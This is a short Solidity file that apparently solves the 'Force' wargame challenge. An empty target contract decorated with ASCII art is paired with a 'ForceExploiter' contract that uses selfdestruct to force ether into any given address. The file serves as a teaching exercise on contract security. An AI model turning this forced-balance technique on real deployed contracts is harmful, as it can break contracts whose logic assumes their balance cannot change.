// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Challenge - add some eth to this contract
contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForceExploiter {
    constructor() payable {}

    // force send funds into the attack
    function attack(address receiver) external {
        address payable rec = payable(receiver);

        selfdestruct(rec);
    }
}
